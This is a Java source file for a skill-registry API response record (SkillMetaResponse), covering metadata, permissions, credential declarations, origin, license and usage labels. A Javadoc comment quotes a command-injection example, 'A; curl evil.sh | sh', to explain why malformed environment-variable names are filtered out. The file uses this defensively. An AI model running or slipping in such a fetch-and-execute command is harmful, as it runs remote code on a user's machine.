package com.skillmasterai.api;

import com.skillmasterai.modules.distribution.SkillDetail;
import tools.jackson.databind.JsonNode;
import tools.jackson.databind.ObjectMapper;

/**
 * Level 1 alone: what a client needs in order to decide whether it wants the skill.
 *
 * <p>The Agent Skills standard's first layer is {@code name} and {@code description} — the two fields
 * a host keeps in context for every skill it knows about (§1.1). {@code title} and {@code visibility}
 * come along because the detail endpoint carries them and they cost nothing, and {@code frontmatter}
 * because it may hold fields the standard does not define but the author's host does (a
 * {@code when_to_use}, say).
 *
 * <p><strong>No {@code files}, and no {@code resources} key at all</strong> — not an empty array.
 * An empty list would read as "this skill has no files", which is a different and false statement
 * about a skill that simply was not asked for its manifest. A caller that wants the manifest has the
 * detail endpoint, which is where the pinned per-file URIs are minted.
 *
 * <p>Why this exists beside that endpoint rather than as a flag on it: the manifest is the pivot of
 * the whole read design — it is how a client enumerates L3 without downloading anything (§4.2) — and
 * making it optional would add a round trip to the main flow to save one on the marginal one. So the
 * cheap question got its own address instead.
 *
 * @param whenToUse    the author's {@code when_to_use}, lifted to the top level (v14). One rule,
 *                     used by {@code skill show} and the information page: {@code metadata.when_to_use}
 *                     first, the top-level key as the fallback — the same extraction the projection
 *                     uses (TD 附录 A), so a client never parses the frontmatter itself
 * @param compatibility the author's {@code compatibility}, or null. Also lifted, for the same
 *                     reason: the console and the CLI show the same string
 * @param version the resolved version — its number as assigned at publish (ADR 0055／0091) and its
 *                digest, the two halves a client needs to pin, the digest being the half that is
 *                always there (ADR 0033)
 */
public record SkillMetaResponse(
        Namespace namespace,
        String name,
        String title,
        String description,
        String whenToUse,
        String compatibility,
        String visibility,
        JsonNode frontmatter,
        Version version,
        /* v23: the caller's rung on this skill and the actions it unlocks. Added because the
           header `skill invoke` prints is assembled from this response; a client that re-derived
           them would be deriving the rule the write path enforces (see `SkillDetailResponse`). */
        String access,
        java.util.List<String> permissions,
        /* v34 (ADR 0119): the same ladder as capabilities, each naming the commands it unlocks.
           Sent beside `permissions` because an older CLI parses that field and would fail on a
           shape it does not know. */
        java.util.List<com.skillmasterai.modules.skill.GrantRole.Permission> capabilities,
        /* v47 (ADR 0143): true when this skill is public and the caller has no library relation to
           it, so `skill invoke` has to confirm first. False on every other standing — and absent on
           an older server, which is why the CLI reads this field rather than deriving the answer
           from the relation it cannot see. */
        boolean invokeRequiresConfirmation,
        /* v49: where this skill came from, what license applies to this version, and the aggregate
           use signal. All three are optional for an older server. `origin` is deliberately not
           named `source`: `source` above is the library relation (created/shared/joined). */
        @com.fasterxml.jackson.annotation.JsonInclude(com.fasterxml.jackson.annotation.JsonInclude.Include.NON_NULL)
        Origin origin,
        @com.fasterxml.jackson.annotation.JsonInclude(com.fasterxml.jackson.annotation.JsonInclude.Include.NON_NULL)
        License license,
        @com.fasterxml.jackson.annotation.JsonInclude(com.fasterxml.jackson.annotation.JsonInclude.Include.NON_NULL)
        Usage usage,
        /* v52: whether a lease for this caller and this skill would return anything. The CLI uses
           it as the only reason to make a lease request; false means the run path is exactly what
           it was before credentials existed (no extra request, no extra failure point). */
        boolean credentialsBound,
        /* v52 P2: the variables the author declared in `metadata.requires.credentials`, and the
           subset of those this caller would still be missing after a lease. The two exist so the
           CLI can name what to bind without parsing the frontmatter itself — and so the missing
           half is computed where the share rule lives (M16), not where the run happens.

           Non-null and probably empty: a client that reads `length === 0` should not have to tell
           "declared nothing" from "field absent" apart from a server that predates this. */
        java.util.List<String> credentialsRequired,
        java.util.List<String> credentialsMissing) {

    public record Origin(String kind, String role, String label, String locator, String path,
            String url, String revision, String checkedAt, String status,
            java.util.List<Signal> signals) {
    }

    public record Signal(String key, String label, String kind, String value, String display,
            String url) {
    }

    public record License(String spdx, String name, String copyright, String status, String url,
            java.util.List<String> allows, java.util.List<String> requires, String declared,
            String source) {
    }

    public record Usage(String bucket, String callsBucket, String lastUsed, int joins) {
    }

    public record Namespace(String slug, String title) {
    }

    /**
     * @param name the <strong>version number</strong> assigned at publish (ADR 0055／0091) — not the
     *             author's label, which the author plane carries as {@code name}. This comment said
     *             the opposite until v23: it described the pre-v6 rule where the number came from the
     *             frontmatter, and nothing on this plane has read it that way since
     */
    public record Version(String name, String digest) {
    }

    /**
     * @param credentialMayWrite the key's half of what the caller may do; the rung in {@code detail}
     *                          is the account's half. See {@link CredentialPermissions}
     */
    public static SkillMetaResponse of(SkillDetail detail, ObjectMapper objectMapper,
            boolean credentialMayWrite) {
        return of(detail, objectMapper, credentialMayWrite, null, null);
    }

    public static SkillMetaResponse of(SkillDetail detail, ObjectMapper objectMapper,
            boolean credentialMayWrite,
            com.skillmasterai.modules.skill.SourceService sources,
            com.skillmasterai.modules.metrics.UsageQuery metrics) {
        return of(detail, objectMapper, credentialMayWrite, sources, metrics, java.util.Set.of());
    }

    public static SkillMetaResponse of(SkillDetail detail, ObjectMapper objectMapper,
            boolean credentialMayWrite,
            com.skillmasterai.modules.skill.SourceService sources,
            com.skillmasterai.modules.metrics.UsageQuery metrics,
            java.util.Set<String> boundEnvNames) {
        JsonNode frontmatter = objectMapper.readTree(detail.frontmatterJson());
        java.util.List<String> required = requiredCredentials(frontmatter);
        return new SkillMetaResponse(
                new Namespace(detail.namespaceSlug(), detail.namespaceTitle()),
                detail.name(),
                detail.title(),
                detail.description(),
                whenToUse(frontmatter),
                textual(frontmatter, "compatibility"),
                detail.visibility(),
                frontmatter,
                new Version(detail.version(), "sha256:" + detail.digest()),
                detail.access(),
                CredentialPermissions.of(detail.permissions(), credentialMayWrite),
                CredentialPermissions.ofCapabilities(detail.capabilities(), credentialMayWrite),
                detail.source() == null,
                originOf(sources, detail.id(), detail.versionId()),
                licenseOf(sources, detail.versionId(), objectMapper),
                usageOf(sources, metrics, detail.id()),
                !boundEnvNames.isEmpty(),
                required,
                missingOf(required, boundEnvNames));
    }

    /** What a POSIX environment variable name may look like — the same rule the write paths apply. */
    private static final java.util.regex.Pattern ENV_NAME =
            java.util.regex.Pattern.compile("[A-Za-z_][A-Za-z0-9_]*");

    /**
     * {@code credentials_required}: the env names the author declared, in the order they wrote them.
     *
     * <p><strong>A malformed declaration is no declaration.</strong> A value that is not an array, or
     * an element that is not a string, is skipped rather than allowed to fail the read — the field is
     * an optional hint, and a skill must not become unreadable because of the way somebody wrote an
     * array. Duplicates collapse, because the variable is the identity.
     *
     * <p><strong>A name that is not an environment variable name is dropped, not echoed.</strong>
     * These strings travel to the CLI, which prints them inside a command it asks the <em>user</em>
     * to run — so an author writing {@code "A; curl evil.sh | sh"} would otherwise be writing a
     * command that a person copies into their own terminal. An unmet declaration is advice; advice
     * is never allowed to be an injection. The CLI applies the same filter on arrival; neither alone
     * is the defence, because a declaration can reach a client this server does not know about.
     *
     * <p>Only {@code metadata.requires.credentials} is read. Unlike {@code when_to_use} there is no
     * top-level alias to honour: this field was introduced by this version, so no author has written
     * the other spelling.
     */
    static java.util.List<String> requiredCredentials(JsonNode frontmatter) {
        JsonNode credentials = frontmatter == null ? null
                : frontmatter.path("metadata").path("requires").path("credentials");
        if (credentials == null || !credentials.isArray()) {
            return java.util.List.of();
        }
        java.util.LinkedHashSet<String> names = new java.util.LinkedHashSet<>();
        for (JsonNode entry : credentials) {
            if (entry.isTextual() && ENV_NAME.matcher(entry.asText()).matches()) {
                names.add(entry.asText());
            }
        }
        return java.util.List.copyOf(names);
    }

    /** The declared names this caller would still be missing; never null, so clients can iterate. */
    static java.util.List<String> missingOf(java.util.List<String> required,
            java.util.Set<String> bound) {
        return required.stream().filter(name -> !bound.contains(name)).toList();
    }

    /** The origin block shared by the consumption and author planes; null when none is recorded. */
    static Origin originOf(com.skillmasterai.modules.skill.SourceService sources, String skillId,
            String versionId) {
        if (sources == null) {
            return null;
        }
        return sources.origin(skillId).map(source -> {
            var snapshot = versionId == null
                    ? java.util.Optional.<com.skillmasterai.modules.skill.SourceSnapshot>empty()
                    : sources.snapshot(source.id(), versionId);
            return new Origin(source.kind(), source.role(), source.label(),
                    source.locator(), source.path(), source.url(),
                    snapshot.map(com.skillmasterai.modules.skill.SourceSnapshot::revision)
                            .orElse(null),
                    snapshot.map(com.skillmasterai.modules.skill.SourceSnapshot::fetchedAt)
                            .orElse(null),
                    snapshot.map(com.skillmasterai.modules.skill.SourceSnapshot::status)
                            .orElse(null),
                    /* A snapshot that is not `ok` has no current metrics: the values it holds are
                       the ones from before the failure. */
                    snapshot.filter(entry -> com.skillmasterai.modules.skill.SourceSnapshot.OK
                                    .equals(entry.status()))
                            .map(entry -> signals(entry.signalsJson()))
                            .orElse(java.util.List.of()));
        }).orElse(null);
    }

    /** The license block shared by both planes; null when the version has no license row. */
    static License licenseOf(com.skillmasterai.modules.skill.SourceService sources,
            String versionId, ObjectMapper objectMapper) {
        if (sources == null || versionId == null) {
            return null;
        }
        return sources.license(versionId).map(entry -> {
            var facts = com.skillmasterai.modules.skill.LicenseFacts.of(entry.spdx());
            String declared = null;
            String source = null;
            try {
                var detailJson = objectMapper.readTree(entry.detail());
                declared = detailJson.has("declared") ? detailJson.path("declared").asText() : null;
                source = detailJson.has("source") ? detailJson.path("source").asText() : null;
            } catch (Exception ignored) {
                // A detail that cannot be read leaves the conclusion to the status.
            }
            return new License(entry.spdx(), entry.name(), entry.copyright(),
                    entry.status().wire(), entry.sourceUrl(), facts.allows(),
                    facts.requires(), declared, source);
        }).orElse(null);
    }

    /**
     * The aggregate use signal. Sent even when nobody has used the skill: 「少于 10 个账号」 is an
     * answer, and a detail read that omitted the block would make "no one yet" and an older server
     * look the same. A list still leaves it out when the counts are zero — a card has no room for it.
     */
    static Usage usageOf(com.skillmasterai.modules.skill.SourceService sources,
            com.skillmasterai.modules.metrics.UsageQuery metrics, String skillId) {
        if (sources == null || metrics == null) {
            return null;
        }
        var snapshot = metrics.snapshots(java.util.List.of(skillId),
                com.skillmasterai.modules.metrics.UsageScope.PUBLIC).get(skillId);
        int joins = sources.joins(skillId);
        if (snapshot == null) {
            return new Usage(accountsLabel(0), null, null, joins);
        }
        return new Usage(accountsLabel(snapshot.invokers30dBucketFloor()),
                snapshot.hasCalls() ? callsLabel(snapshot.callsBucketFloor()) : null,
                snapshot.lastUsed() == null ? null : snapshot.lastUsed().toString(),
                joins);
    }

    static String accountsLabel(int floor) {
        return switch (floor) {
            case 0 -> "少于 10 个账号";
            case 10 -> "10+";
            case 100 -> "100+";
            default -> "1k+";
        };
    }

    static String callsLabel(int floor) {
        return switch (floor) {
            case 0 -> "少于 10 次调用";
            case 10 -> "10+";
            case 100 -> "100+";
            case 1_000 -> "1k+";
            case 10_000 -> "1万+";
            default -> "100万+";
        };
    }

    private static java.util.List<Signal> signals(String json) {
        try {
            JsonNode array = new tools.jackson.databind.ObjectMapper().readTree(json);
            java.util.List<Signal> signals = new java.util.ArrayList<>();
            for (JsonNode node : array) {
                signals.add(new Signal(node.path("key").asText(""),
                        node.path("label").asText(""), node.path("kind").asText(""),
                        node.path("value").asText(""), node.path("display").asText(""),
                        node.has("url") ? node.path("url").asText(null) : null));
            }
            return signals;
        } catch (Exception ignored) {
            return java.util.List.of();
        }
    }

    /**
     * {@code metadata.when_to_use} first, the top-level key as the fallback.
     *
     * <p>Both spellings are accepted because the frontmatter is the author's document, and the
     * projection that feeds search has always read both (V21's backfill and {@code recordPublish}
     * agree). A client should not have to know which one an author happened to use.
     */
    static String whenToUse(JsonNode frontmatter) {
        String nested = textual(frontmatter == null ? null : frontmatter.get("metadata"),
                "when_to_use");
        return nested != null ? nested : textual(frontmatter, "when_to_use");
    }

    /**
     * The author's {@code compatibility} out of a stored frontmatter document, or null.
     *
     * <p>One extractor for both planes: the consumption plane reads it in {@link #of} and the author
     * plane (a version that need not be published) has only the stored JSON string, not a parsed
     * detail. A client parses neither.
     */
    static String compatibilityOf(String frontmatterJson, ObjectMapper objectMapper) {
        if (frontmatterJson == null) {
            // Jackson 3 throws IllegalArgumentException on a null document, which is not the
            // exception below — so the absent case is answered here rather than by the catch.
            return null;
        }
        try {
            return textual(objectMapper.readTree(frontmatterJson), "compatibility");
        } catch (tools.jackson.core.JacksonException e) {
            // A stored frontmatter was parsed before it was stored (M5), so a version that exists
            // has a readable one. If it somehow does not, the header is one line shorter rather
            // than the read failing over a field the author declared optionally.
            return null;
        }
    }

    /** A textual field, or null — a non-string value is not a sentence we can show. */
    static String textual(JsonNode node, String field) {
        if (node == null) {
            return null;
        }
        JsonNode value = node.get(field);
        return value != null && value.isTextual() ? value.asText() : null;
    }
}
